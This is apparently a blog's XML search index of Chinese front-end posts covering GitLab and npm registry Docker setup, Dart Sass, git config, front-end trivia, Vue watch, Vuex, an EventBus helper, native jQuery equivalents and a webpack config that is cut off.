GITLAB_OMNIBUS_CONFIG: | # external_url &#39;http://gitlab.example.com:9090&#39; gitlab_rails[&#39;time_zone&#39;] = &#39;Asia/Shanghai&#39; ports: - &#39;80:80&#39; - &#39;443:443&#39; - &#39;2224:22&#39; volumes: - ./cn/config:/etc/gitlab - ./cn/logs:/var/log/gitlab - ./cn/data:/var/opt/gitlab 拓展重置普通用户的密码进入容器之后执行以下命令$ gitlab-rails console production # 进入gitlab管理控制台 irb(main):001:0&gt; user=User.where(name: &quot;[user_name]&quot;).first # 将 [user_name] 替换成用户名 irb(main):001:0&gt; user.password=12345678 irb(main):001:0&gt; user.password_confirmation=12345678 irb(main):001:0&gt; user.save! irb(main):001:0&gt; quit 重设管理员密码进入容器之后执行以下命令$ gitlab-rails console production # 进入gitlab管理控制台 irb(main):001:0&gt; user=User.where(id: 1).first # 将 [user_name] 替换成用户名 irb(main):001:0&gt; user.password=12345678 irb(main):001:0&gt; user.password_confirmation=12345678 irb(main):001:0&gt; user.save! irb(main):001:0&gt; quit 私有 npm 代理注册表version: &#39;3&#39; services: npm-private: container_name: npm-private image: verdaccio/verdaccio restart: always ports: - &#39;4873:4873&#39; 拓展CSS预处理SASS的默认实现将迁移到 Dart SassWeb开发中流行的CSS预处理 - Sass 14,于2016年11月1日在博客正式对外公布了alpha版本的Dart Sass 32项目,即他们使用Dart对Sass进行了重写。对于这次迁移/重写,Sass项目组做了以下说明：关于 github:dart-sass dart-sass因为使用 node-sass 无论是在 Windows 环境下还是在 docker 的 liunx 环境下都需要依赖 gcc 和 python2.7,有的时候会出现编译错误（指的是在执行 npm install 安装 node-sass 的时候由于部分库不齐备或者是编译原因导致 node-sass 无法正常安装）,所以使用 dart-sass 来代替 node-sass 是个不错的选择,至少目前在自测中是没有出现编译问题的,至于兼容性问题,GitHub 文档中也给出承诺 Browser Compatibility为什么重写Sass？Sass 的主要实现有 Ruby Sass 7 和 LibSass 10（node-sass 底层使用的是 LibSass）,它们都有各自的优缺点。Ruby Sass 的实现语言是高级语言 Ruby,更容易迭代,但存在运行速度慢,不易安装的缺点。LibSass 虽然速度快,但它的开发语言是 C/C++,迭代速度慢,无法快速地添加各种功能。为什么使用Dart？Dart 的运行速度是真的快,对于大型样式文件,Dart Sass 的处理速度是 Ruby Sass 的5~10 倍,且只比 LibSass 慢 1.5 倍左右。同时,Dart 是一门具备静态类型的动态语言,对比 C/C++ 甚至是 Ruby,Dart 相对更容易上手且代码也更易于编写和维护。此外,Dart 具备编译输出为 JavaScript 的能力,使得 Dart Sass 可以兼容 NodeJS 平台。各种实现的后续规划？LibSass 作为目前性能最好的 Sass 实现,后续将继续维护,只是它不再需要背负快速添加各种新功能的压力。Ruby Sass 目前也会同步维护,但在无人接手的情况下,它将逐渐边缘化。Sass项目组后续主要精力将转移到 Dart Sass,其稳定版本预计在 2017 年初放出。git commit现在由于我们在 docker 内部安装项目依赖,也就是说我们当前的环境变成了 liunx,相关的依赖包也就是 liunx 的依赖包,所以在 windows 环境下执行 git commit 的时候会报依赖找不到,那是因为安装了 liunx 的依赖包,两个平台的安装包是不一样的那么在 docker 下执行 git commit 的时候又会失败,因为 commit 的时候 git 需要知道当前的 commit 作者是谁,这时候不必全局配置 commit 的 config 信息,只需在项目目录下执行git config user.name &#39;XXX&#39; git config user.email &#39;XXX&#39; # or git config --local user.name &#39;XXX&#39; git config --local user.email &#39;XXX&#39; 设置完用 git config --list 进行检验,之后的 commit 操作就在 docker 容器下执行就行了]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>liunx</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WEB 前端冷门知识]]></title>
    <url>%2Farchives%2Fc3d6f742.html</url>
    <content type="text"><![CDATA[最近在牛客网上刷前端相关的题目,发现自己真的不堪一击,菜的要死,毕竟都是大厂出的题目,在刷题的过程中同时也学到了不少的冷门知识（主要是自己做错的题目里的知识点）,现在分享出来,真的有用,注意这里面内容纯理论HTML置换元素：浏览器根据元素的标签和属性来决定元素的具体显示内容非置换元素：浏览器的大多数元素都是不可置换元素,即其内容直接展示给浏览器input 元素设置 readonly:true =&gt; 脚本无法修改 input 的值 （F）input 元素设置 disabled:true =&gt; 脚本无法修改 input 的值（F）input 元素设置 readonly:true =&gt; input 的值不会随表单提交（F）input 元素设置 disabled:true =&gt; input 的值不会随表单提交（T）DHTML 的动态样式作用：使网页作者改变内容的外部特征而不强制用户再次下载全部内容HTML5 获取某用户当前位置信息 =&gt; getCurrentPosition()reflow(回流) =&gt; 对 DOM 树进行渲染,修改 DOM 或修个元素的形状大小,就会触发 reflowenctype =&gt; 规定在发送发送服务器之前对表单数据进行编码的方式application/x-www-form-urlencoded 在发送前边吗所有的字符multipart/form-data 部队字符编码的使用包含文件上传控件表单,必须包含的方式text/plan 空格转换为 ‘+’ 加号,但不对特殊字符进行编码htmlDoctype 告诉浏览器文档使用哪一种 html 或者 xhtml不同文档模式（htmlDoctype）影响 css 内容呈现,尤其是对盒模型文档模式使得不同浏览器在混杂模式下差异大CSS当 margin-top、padding-top 的值是百分比时,分别计算相对最近父级元素的 width,相对最近父级元素的 widthposition: static =&gt; 无定位position: absolute =&gt; 绝对定位position: fixed =&gt; 相对窗口的固定定位position: relative =&gt; 相对定位mozilla(gecko) 内核 =&gt; 浏览器：firefox、flock 等 =&gt; css 兼容前缀：-mozwebkit 内核 =&gt; 浏览器：safari、chrome 等 =&gt; css 兼容前缀：-webkitopera 内核 =&gt; 浏览器：opera 等 =&gt; css 兼容前缀：-otrident 内核 =&gt; 浏览器：ie 等 =&gt; css 兼容前缀：-ms选择器优先级：ID 选择器&gt;class选择器=伪类选择器&gt;标签名陈选择器在不涉及样式情况下,页面元素的优先显示与结构摆放顺序无关（F）JavaScriptPromise 的三种状态异步操作（未完成）=&gt; pending异步操作（已完成）=&gt; resolved (又称 fulfilled)异步操作（失 败） =&gt; rejected状态改变只能是 pending =&gt; resolved 或者 pending =&gt; rejected状态一旦改变就不能再次进行改变JavaScript 基本数据类型：String、Boolean、Null、Number、undefindJavaScript 复杂数据类型：Object、Array、Function、RegExp、Date、ErrorJavaScript 全局数据类型：MathJavaScript 全局函数：escape()、eval()、isFinte()、isNaN()、parseFloat()、parseInt()、unescape()JavaScript 异步编程回调函数：这是异步编程最基本的方法事件监听：另一种思路是采用事件驱动模式,任务的执行不取决于代码的顺序,而取决于某事件是否发生发布/订阅：上一节的”事件”,完全可以理解成”信号”Promise 对象：Promise 对象是 CommanJS 工作组提出的一种规范,目的是为异步编程提供统一接口RegExp 对象三个方法 =&gt; test()、exec()、compile()JavaScript 内置对象：Arguments（函数参数集合）、Array（数组）、Boolean（布尔）、Date（日期）、Error（异常）、Function（函数）、Math（数学）、Number（数值）、Object（基础）、String（字符串）、RegExp（正则表达式）history.length 返回浏览器你是列表的 URL 的数量history.back() 加载 history 列表的前一个 URLhistory.forward() 加载 history 列表的下一个 URLhistory.go() 加载 history 列表中的某个具体页面call 与 apply 都属于 Function.prototype 的一个方法,所以每一个 Function 实例都有 call、apply 属性call 第一个参数是 this,传递给函数的参数必须逐个列举出来；apply 传递函数的参数是数组,就是多个参数组合成一个数组传入call 传入的是直接参数列表,可见一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象跨域 =&gt; 浏览器不会将存在跨域限制的服务端口响应正常交给客户端代码去处理hasOwnproperty() =&gt; 判断一个对象是否包含有属性或者对象isPrototypeOf() =&gt; 判断检查其原型链对象是否存在于指定对象中把鼠标一定到按钮上点击,发生 =&gt; hover -&gt; focus -&gt; activeAjax 的优势在于开放性、易用性及易于开发Flash 的优势在于多媒体处理,可以更容易地调用浏览器之外的外部资源Ajax 最主要的批评就是他可能坏浏览器地后退功能Flash 文件经常会很大,用户第一次使用的是否需要让来的时间较长构建工具gulpgulp 强调的是前端开发的工作流程,我们可以通过配置一系列的 task,定义 task 处理的事务（例如文件压缩合并、雪碧图、启动 server、版本控制等）,然后定义执行顺序,来让 gulp 执行这些task,从而构建项目的整个前端开发流程。PS：简单说就一个Task Runnerwebpackwebpack 是一个前端模块化方案,更侧重模块打包,我们可以把开发中的所有资源（图片、js 文件、css 文件等）都看成模块,通过 loader（加载器）和 plugins（插件）对资源进行处理,打包成符合生产环境部署的前端资源。PS：webpack is a module bundle两者区别虽然都是前端自动化构建工具,但看他们的定位就知道不是对等的。gulp与webpack上是互补的,还是可替换的,取决于你项目的需求gulp 严格上讲,模块化不是他强调的东西,他旨在规范前端开发流程。webpack 更是明显强调模块化开发,而那些文件压缩合并、预处理等功能,不过是他附带的功能。版本控制工具GITGit 是一个分布式版本控制系统,操作命令包括：clone,pull,push,branch ,merge ,push,rebase,Git擅长的是程序代码的版本化管理。SVNSVN 是一个集中式版本控制系统,SVN只能有一个指定中央版本库。当这个中央版本库有问题时,所有工作成员都一起瘫痪直到版本库维修完毕或者新的版本库设立完成两者区别Git 与 SVN 区别点：GIT 是分布式的,SVN 不是：这是 GIT 和其它非分布式的版本控制系统,例如 SVN,CVS 等,最核心的区别。GIT 把内容按元数据方式存储,而 SVN 是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。GIT 分支和 SVN 的分支不同：分支在 SVN 中一点不特别,就是版本库中的另外的一个目录。GIT 没有一个全局的版本号,而 SVN 有：目前为止这是跟 SVN 相比 GIT 缺少的最大的一个特征。GIT 的内容完整性要优于 SVN：GIT 的内容存储使用的是 SHA-1 哈希算法。这能确保代码内容的完整性,确保在遇到磁盘故障和网络问题时降低对版本库的破坏。是通过.git和.svn文件,.git只是在本地的版本库的目录下存在,而.svn存在于每一个文件夹,当我们不需要版本控制的时候,要删除.svn很费时。网络基础HTTP 协议所使用的运输层协议是 TCP/IPHTTPS 的默认端口号是 443TCP 注重数据可靠性,UDP 注重数据传输快传输层提供端对端的可靠文传递和错误恢复DNS 协议大多数运行在 UDP 协议上DNS 的默认端口号是 53HTTP 工作于应用层,HTTPS 工作于传输层进程和线程进程是资源分配的最小单位线程是资源调度的最小单位进程是动态的、多个进程可以包含相同的程序和多个进程可以进行并发运行算法排序算法：插入排序、希尔排序、冒泡排序、堆排序、归并排序、快速排序、选择排序排序算法不稳定的有：希尔排序、堆排序、快速排序、选择排序]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>CSS</tag>
        <tag>HTML5</tag>
        <tag>jQuery</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue 中 watch 的详细用法]]></title>
    <url>%2Farchives%2F1abefd7d.html</url>
    <content type="text"><![CDATA[一个对象,键是需要观察的表达式,值是对应回调函数。值也可以是方法名,或者包含选项的对象。Vue 实例将会在实例化时调用 $watch(),遍历 watch 对象的每一个属性。API$watch()简单的用法&lt;script&gt; export default { data() { return { cityName: &#39;shanghai&#39; } }, watch: { cityName(newName, oldName) { // ... } } } &lt;/script&gt; 或者&lt;script&gt; export default { data() { return { cityName: &#39;shanghai&#39; } }, watch: { cityName: &#39;nameChange&#39; }, methods: { nameChange(newName, oldName) { // ... } } } &lt;/script&gt; immediate 和 handler这样使用watch时有一个特点,就是当值第一次绑定的时候,不会执行监听函数,只有值发生改变才会执行。如果我们需要在最初绑定值的时候也执行函数,则就需要用到immediate属性。比如当父组件向子组件动态传值时,子组件props首次获取到父组件传来的默认值时,也需要执行函数,此时就需要将immediate设为true。&lt;script&gt; export default { data() { return { cityName: &#39;shanghai&#39; } }, watch: { cityName(newName, oldName) { // ... }, immediate: true } } &lt;/script&gt; 监听的数据后面写成对象形式,包含 handler 方法和 immediate,之前我们写的函数其实就是在写这个 handler 方法；immediate 表示在 watch 中首次绑定的时候,是否执行 handler,值为 true 则表示在 watch 中声明的时候,就立即执行 handler 方法,值为 false,则和一般使用 watch 一样,在数据发生变化的时候才执行 handler。deep当需要监听一个对象的改变时,普通的watch方法无法监听到对象内部属性的改变,只有data中的数据才能够监听到变化,此时就需要deep属性对对象进行深度监听。&lt;script&gt; export default { data() { return { cityName: { id: 1, name: &#39;shanghai&#39; } } }, watch: { cityName: { handler(newName, oldName) { // ... }, deep: true, immediate: true } } } &lt;/script&gt; 设置 deep: true 则可以监听到 cityName.name 的变化,此时会给 cityName 的所有属性都加上这个监听器,当对象属性较多时,每个属性值的变化都会执行 handler。如果只需要监听对象中的一个属性值,则可以做以下优化：使用字符串的形式监听对象属性：&lt;script&gt; export default { data() { return { cityName: { id: 1, name: &#39;shanghai&#39; } } }, watch: { &#39;cityName.name&#39;: { handler(newName, oldName) { // ... }, deep: true, immediate: true } } } &lt;/script&gt;]]></content>
      <categories>
        <category>vuejs</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在 vue.js 项目中使用 vuex]]></title>
    <url>%2Farchives%2F8d74e1c7.html</url>
    <content type="text"><![CDATA[Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。 它采用集中式存储管理应用的所有组件的状态, 并以相应的规则保证状态以一种可预测的方式发生变化。 这里就简单的介绍 vuex 的使用方法文档vuex 官方文档关于 vuex 的严格模式在 vuex 有个参数是 strict 这个是可以配置 vuex 开启严格模式, 这里极力推荐开启严格模式, 当然是在开发模式下, 线上模式可以进行关闭, 因为我们不希望内部逻辑暴露在外面。至于为什么极力推荐开启 vuex 的严格模式, 有以下这些原因：官方也是这么推荐的, vuex 中的数据被称作 state, 这些数据通过 getters 将其暴露给组件使用, 那么要想改变其值只能在 vuex 内部实现（即 modules 和 actiions, 具体可以阅读官方文档）vuex 被设计出来就是一个第三方的状态管理仓库, 当然这些状态也只能由内部的逻辑实现, 外部也可以对 state 的值进行改变, 但是不推荐我们常说的 cookie 也好 session 也好, 它们有个致命的弱点, 就是比较容易被窃取, 那么 vuex 就规避了这些缺点, 因为所有的数据都在 vuex 的 store 仓库, 只能由 vuex 内部的状态来管理, 就不容易被窃取, 如果由外部的逻辑来改变 state 值, 那么 vuex 的安全性岌岌可危更多详情请阅读 vuex 严格模式关于 vuexstate =&gt; 单一状态树,数据存储库,即驱动应用的数据源getter =&gt; 派生出 state 的值mutation =&gt; 更改状态的唯一途径,直接修改状态action =&gt; 提交 mutation,不是直接修改状态,相应在 view 上的用户输入导致状态的变化module =&gt; 整合一个模块的 state、getter、mutation、actionview =&gt; 以声明方式将 state 映射到视图install使用命令安装 vuex 依赖npm i -D vuex # or yarn add vuex 目录结构我们单独创建一个 store 目录, 目录结构大致是|-- src |-- store |-- modules |-- index.js |-- ... ... |-- getters.js # 根级别的 mutation =&gt; |-- index.js # 我们组装模块并导出 store 的地方 |-- mutation-types.js # 根级别的 type =&gt; 状态 |-- main.js 导入 vuexsrc/mian.jsimport Vue from &#39;vue&#39; import store from &#39;@/store&#39; Vue.config.productionTip = false new Vue({ store, render: h =&gt; h(App), }).$mount(&#39;#app&#39;) strore/index.jsimport Vue from &#39;vue&#39; import Vuex from &#39;vuex&#39; import modules from &#39;./modules&#39; import getters from &#39;./getters&#39; Vue.use(Vuex) const debug = true // 推荐开启严格模式 export default new Vuex.Store({ modules, getters, strict: debug }) strore/getters.jsconst getters = { [stateName]: state =&gt; state. [modulesName]. [stateName] } export default getters store/modules/index.jsconst files = require.context(&#39;.&#39;, false, /\.js$/) const modules = {} files.keys().forEach(key =&gt; { if (key === &#39;./index.js&#39;) return modules[key.replace(/(\.\/|\.js)/g, &#39;&#39;)] = files(key).default }) export default modules store/mutation-types.js// 这边必须使用全大写, 没有为什么 export const TYPES_NAME = &#39;TYPES_NAME&#39; vuex 食用例子做完以上的工作之后我们就可以进行使用 vuex 了, 下方举一个最简单的两个数的 加减乘除 的例子在线访问 Edit on CodeSandboxstore/mutation-types.jsexport const ADDITION = &#39;ADDITION&#39; // + 加法 export const SUBSTRUCTION = &#39;SUBSTRUCTION&#39; // - 减法 export const MULTIPLICATION = &#39;MULTIPLICATION&#39; // * 乘法 export const DIVISION = &#39;DIVISION&#39; // / 除法 store/modules/operation.jsimport { ADDITION, SUBSTRUCTION, MULTIPLICATION, DIVISION } from &#39;@/store/mutation-types&#39; const operation = { state: { result: 0 }, mutations: { [ADDITION]: (state, payload) =&gt; { state.result = Number(payload.a) + Number(payload.b) }, [SUBSTRUCTION]: (state, payload) =&gt; { state.result = Number(payload.a) - Number(payload.b) }, [MULTIPLICATION]: (state, payload) =&gt; { state.result = Number(payload.a) * Number(payload.b) }, [DIVISION]: (state, payload) =&gt; { state.result = Number(payload.a) / Number(payload.b) } }, actions: { addition({ commit }, payload) { commit(ADDITION, payload) }, substrction({ commit }, payload) { commit(SUBSTRUCTION, payload) }, multiplication({ commit }, payload) { commit(MULTIPLICATION, payload) }, division({ commit }, payload) { commit(DIVISION, payload) } } } export default operation store/getters.jsconst getters = { result: state =&gt; state.operation.result } export default getters views/Operation.vue&lt;template&gt; &lt;div&gt; &lt;div&gt; &lt;input type=&quot;number&quot; v-model=&quot;payload.a&quot; placeholder=&quot;参数 A&quot; style=&quot;margin:0 5px;height:18px;width:50px;&quot; /&gt; {{ operation }} &lt;input type=&quot;number&quot; v-model=&quot;payload.b&quot; placeholder=&quot;参数 B&quot; style=&quot;margin:0 5px;height:18px;width:50px;&quot; /&gt; = {{ result }} &lt;/div&gt; &lt;div style=&quot;margin-top:10px&quot;&gt; &lt;button @click=&quot;addition&quot; style=&quot;margin:0 5px;&quot;&gt;+&lt;/button&gt; &lt;button @click=&quot;substrction&quot; style=&quot;margin:0 5px;&quot;&gt;-&lt;/button&gt; &lt;button @click=&quot;multiplication&quot; style=&quot;margin:0 5px;&quot;&gt;*&lt;/button&gt; &lt;button @click=&quot;division&quot; style=&quot;margin:0 5px;&quot;&gt;/&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import { mapGetters } from &#39;vuex&#39; export default { data () { return { operation: &#39;+&#39;, payload: { a: 0, b: 0 } } }, computed: { ...mapGetters([&#39;result&#39;]) }, methods: { addition () { this.operation = &#39;+&#39; this.$store.dispatch(&#39;addition&#39;, this.payload) }, substrction () { this.operation = &#39;-&#39; this.$store.dispatch(&#39;substrction&#39;, this.payload) }, multiplication () { this.operation = &#39;*&#39; this.$store.dispatch(&#39;multiplication&#39;, this.payload) }, division () { this.operation = &#39;/&#39; this.$store.dispatch(&#39;division&#39;, this.payload) } } } &lt;/script&gt;]]></content>
      <categories>
        <category>vuejs</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue.js 发送全局事件（Bus）]]></title>
    <url>%2Farchives%2F5ccfcaf1.html</url>
    <content type="text"><![CDATA[vue 1.0 废弃了 vm.$broadcast 和 vm.$dispatch 的 API,那么在兄弟组件之间进行通信就变的异常为难,现在就需要一个比较便捷的解决方法。那么,eventBus的作用就体现出来了,主要是实现途径是在要相互通信的兄弟组件之中,都引入一个新的 vue 实例,然后通过分别调用这个实例的事件触发和监听来实现通信和参数传递起因在 vue1.0 中,组件之间的通信主要通过 vm.$dispatch 沿着父链向上传播和用 vm.$broadcast 向下广播来实现。然而在 vue2.0 中,已经废除了这种用法。vuex加入后,对组件之间的通信有了更加清晰的操作,对于中大型的项目来说,一开始就把vuex的使用计划在内是明智的选择。然而在一些小型的项目,或者说像我这样写到一半才发现vue2.0用不了$.broadcast和$dispatch的人来说,就需要一个比较便捷的解决方法。那么,eventBus的作用就体现出来了。主要是现实途径是在要相互通信的兄弟组件之中,都引入一个新的vue实例,然后通过分别调用这个实例的事件触发和监听来实现通信和参数传递。EventBus 的简介EventBus 又称为事件总线。在 Vue 中可以使用 EventBus 来作为沟通桥梁的概念,就像是所有组件共用相同的事件中心,可以向该中心注册发送事件或接收事件,所以组件都可以上下平行地通知其他组件,但也就是太方便所以若使用不慎,就会造成难以维护的灾难,因此才需要更完善的 Vuex 作为状态管理中心,将通知的概念上升到共享状态层次。著作权归作者所有。注意 eventBus 是专门处理 同一个路由下 的复杂组件之间通信的。,相对于不同路由之间的通信可以考虑使用 vuex 或者 vue-router更加详细的 vue 组件通信vue 组件的通信Vue 2.0学习笔记：事件总线（EventBus）总结一下Vue通信的几个方式,和各自的适用场景父子组件通信: 父子关系eventBus通信 : 同一个路由下,复杂组件的通信。Vuex: 全局的、跨越路由、非父子组件的通信都可以用它关系利用$route的params或者query: 跨路由的可以用,但同一个路由下就不适合用了。localStorage / cookie / sessionStorage: 全局可以用,但是存储到本地甚至利用Vue实例上添加值 （不建议）封装的 bus.jsbus.jsimport Vue from &#39;vue&#39; const bus = new Vue({}) let _on = bus.$on let _emit = bus.$emit let _off = bus.$off bus.$on = (name, fn) =&gt; { if (bus._events[name]) { bus.$off(name) } _on.call(bus, name, fn) } bus.$off = (name) =&gt; { if (name &amp;&amp; bus._events[name]) { _off.call(bus, name) } } bus.$emit = (name, params) =&gt; { if (!params || !params.from) { console.warn &amp;&amp; console.warn(&#39;The paramter(from) is null&#39;) } _emit.call(bus, name, params) } export default bus main.jsimport Vue from &#39;vue&#39; import bus from &#39;@/utils/bus&#39; Vue.prototype.$bus = bus new Vue({ el: &#39;#app&#39;, components: { App }, template: &#39;&lt;App/&gt;&#39; }) 食用栗子a.vue&lt;template&gt; &lt;div&gt; &lt;button @click=&quot;onClick&quot;&gt;按钮&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: &#39;a&#39;, methods: { onClick() { this.$bus.$emit(&#39;event&#39;, { from: &#39;a&#39;, to: &#39;b&#39;, message: &#39;hello&#39; }) } } } &lt;/script&gt; b.vue&lt;template&gt; &lt;div&gt; &lt;span&gt;{{ message }}&lt;/button&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: &#39;a&#39;, data () { return { message: &#39;&#39; } }, mounted () { this.$bus.$on(&#39;event&#39;, res =&gt; { // console.log(res) // 只有监听一次的时候 // this.$bus.$off(&#39;event&#39;) this.message = res.message }) }, beforeDestroy() { // 事件并不会自动销毁,所以要在逐渐地销毁之前将其关闭 this.$bus.$off(&#39;event&#39;) } } &lt;/script&gt;]]></content>
      <categories>
        <category>vuejs</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript 原生实现 jQuery 的方法]]></title>
    <url>%2Farchives%2Fd57d6c8a.html</url>
    <content type="text"><![CDATA[提供 jQuery 中的 $()、siblings()、addClass()、hasClass()、removeClass()、toggleClass() 等方法的原生 JavaScript 实现方法,以下方法适用于 Vue.js 项目Vue.js 不等于 jQuery个人强烈推荐,既然用了 Vue.js 来做项目的话,不要去引用 jQuery,因为 jQuery 能实现的功能,在 Vue.js 的项目一定能找到对应的解决方案。但是有人就说了,我就是想用 jQuery 中的某些方法,然鹅 Vue.js 却找不到对应的 API 或者根本不知道它在哪里,所以下面收集了几个原生 JavaScript 实现方法仅供参考。$()&lt;script&gt; export default { methods: { $(obj) { return document.querySelectorAll(obj) } } } &lt;/script&gt; siblings()&lt;script&gt; export default { methods: { siblings(elem) { let a = []; let b = elem.parentNode.children; for (let i = 0;i &lt; b.length;i++) { if (b[i] !== elem) a.push(b[i]); } return a; } } } addClass()&lt;script&gt; export default { methods: { addClass(ele, cls) { ele.className = `${ele.className} ${cls}`; } } } hasClass()&lt;script&gt; export default { methods: { hasClass(ele, cls) { return ele.className.match(new RegExp(&quot;(\\s|^)&quot; + cls + &quot;(\\s|$)&quot;)); } } } &lt;/script&gt; removeClass()&lt;script&gt; export default { methods: { removeClass(ele, cls) { if (this.hasClass(ele, cls)) { let reg = new RegExp(&quot;(\\s|^)&quot; + cls + &quot;(\\s|$)&quot;); ele.className = ele.className.replace(reg, &quot; &quot;); } } } } toggleClass()&lt;script&gt; export default { methods: { toggleClass(ele, cls) { if (this.hasClass(ele, cls)) { this.removeClass(ele, cls); } else { this.addClass(ele, cls); } } } }]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack 初学指南]]></title>
    <url>%2Farchives%2F81367a4f.html</url>
    <content type="text"><![CDATA[这边用到的 webpack 版本 4.0+,这边将接触到 TypeScript,ES6,ES7,sass 等 loader …不想解释了直接上代码目录结构--- dist |- css |- js |- images |- fonts |- index.html --- src |- scss |- js |- images |- fonts |- index.html package.json{ &quot;name&quot;: &quot;webpack-demo&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;serve&quot;: &quot;webpack-dev-server --compress --progress &quot;, &quot;dev&quot;: &quot;webpack --mode development&quot;, &quot;build&quot;: &quot;webpack --mode production&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;MIT&quot;, &quot;devDependencies&quot;: { &quot;@babel/core&quot;: &quot;^7.1.5&quot;, &quot;@babel/preset-env&quot;: &quot;^7.1.5&quot;, &quot;autoprefixer&quot;: &quot;^9.3.1&quot;, &quot;babel-cli&quot;: &quot;^6.26.0&quot;, &quot;babel-eslint&quot;: &quot;^10.0.1&quot;, &quot;babel-loader&quot;: &quot;^8.0.4&quot;, &quot;babel-preset-env&quot;: &quot;^1.7.0&quot;, &quot;clean-webpack-plugin&quot;: &quot;^1.0.0&quot;, &quot;compression-webpack-plugin&quot;: &quot;^2.0.0&quot;, &quot;css-loader&quot;: &quot;^1.0.1&quot;, &quot;eslint&quot;: &quot;^5.9.0&quot;, &quot;eslint-loader&quot;: &quot;^2.1.1&quot;, &quot;file-loader&quot;: &quot;^2.0.0&quot;, &quot;html-webpack-plugin&quot;: &quot;^3.2.0&quot;, &quot;html-withimg-loader&quot;: &quot;^0.1.16&quot;, &quot;mini-css-extract-plugin&quot;: &quot;^0.4.4&quot;, &quot;node-sass&quot;: &quot;^4.10.0&quot;, &quot;open-browser-webpack-plugin&quot;: &quot;0.0.5&quot;, &quot;optimize-css-assets-webpack-plugin&quot;: &quot;^5.0.1&quot;, &quot;postcss-loader&quot;: &quot;^3.0.0&quot;, &quot;sass-loader&quot;: &quot;^7.1.0&quot;, &quot;standard&quot;: &quot;^12.0.1&quot;, &quot;style-loader&quot;: &quot;^0.23.1&quot;, &quot;ts-loader&quot;: &quot;^5.3.0&quot;, &quot;typescript&quot;: &quot;^3.1.6&quot;, &quot;url-loader&quot;: &quot;^1.1.2&quot;, &quot;webpack&quot;: &quot;^4.25.1&quot;, &quot;webpack-cli&quot;: &quot;^3.1.2&quot;, &quot;webpack-dev-server&quot;: &quot;^3.1.10&quot; } } .babelrc{ &quot;presets&quot;: [&quot;@babel/preset-env&quot;] } .eslintrc.jsmodule.exports = { root: true, env: { node: true, browser: true }, extends: [ &#39;standard&#39; ] } tsconfig.json{ &quot;compilerOptions&quot;: { &quot;module&quot;: &quot;commonjs&quot;, &quot;target&quot;: &quot;es5&quot;, &quot;sourceMap&quot;: true, &quot;experimentalDecorators&quot;: true }, &quot;exclude&quot;: [ &quot;node_modules&quot; ] } webpack.config.jsconst path = require(&#39;path&#39;) // 拆分 css 出来单独打包 const MiniCssExtractPlugin = require(&#39;mini-css-extract-plugin&#39;) // 添加不同浏览器的兼容 const autoprefixer = require(&#39;autoprefixer&#39;) // 打包之前清掉原打包信息 const CleanWebpackPlugin = require(&#39;clean-webpack-plugin&#39;) // 结合 postcss 来解决不同浏览器的兼容 const OptimizeCssAssetsPlugin = require(&#39;optimize-css-assets-webpack-plugin&#39;) const HtmlWebpackPlugin = require(&#39;html-webpack-plugin&#39;) const OpenBrowserPlugin = require(&#39;open-browser-webpack-plugin&#39;) const CompressionWebpackPlugin = require(&#39;compression-webpack-plugin&#39;) const productionGzipExtensions = [&#39;js&#39;, &#39;css&#39;] module.exports = { mode: &#39;development&#39;, entry: path.join(__dirname, &#39;./src/js/main.ts&#39;), output: { filename: &#39;js/[name]-[hash:32].js&#39;, path: path.resolve(__dirname, &#39;dist&#39;) }, resolve: { extensions: [&#39;.js&#39;, &#39;.json&#39;, &#39;.css&#39;, &#39;.scss&#39;, &#39;.sass&#39;, &#39;ts&#39;], alias: { &#39;@&#39;: path.join(__dirname, &#39;src&#39;) } }, module: { rules: [ { test: /\.ts$/, exclude: /node_modules/, use: &#39;ts-loader&#39; }, { test: /\.js$/, exclude: /node_modules/, use: [ { loader: &#39;babel-loader&#39; } ] }, { test: /\.(css)$/, // exclude: /node_modules/, use: [{ loader: &#39;css-loader&#39;, options: { importLoaders: 2 } }] }, { test: /\.(sass|scss)$/, // exclude: /node_modules/, use: [ { loader: MiniCssExtractPlugin.loader }, { loader: &#39;css-loader&#39;, options: { importLoaders: 2 } }, { loader: &#39;postcss-loader&#39;, options: { plugins: () =&gt; [ autoprefixer({ browsers: [ &#39;ie &gt;= 8&#39;, &#39;ie_mob &gt;= 10&#39;, &#39;ff &gt;= 26&#39;, &#39;chrome &gt;= 20&#39;, &#39;safari &gt;= 6&#39;, &#39;opera &gt;= 12&#39;, &#39;Firefox &gt;= 24&#39;, &#39;Explorer &gt;= 8&#39;, &#39;ios &gt;= 5&#39;, &#39;android &gt;= 2.3&#39;, &#39;bb &gt;= 10&#39;, &#39;last 1 version&#39; ] }) ] } }, { loader: &#39;sass-loader&#39; } ] }, { test: /\.(jpg|png|gif|jpeg|woff|woff2|svg|ttf|eot)$/, use: [ { loader: &#39;url-loader&#39;, options: { limit: 8192, name: &#39;images/[name]-[hash:32].[ext]&#39; } } ] }, { test: /\.html$/, loader: &#39;html-withimg-loader&#39; }, { test: /\.(woff|woff2|svg|ttf|eot)$/, use: [ 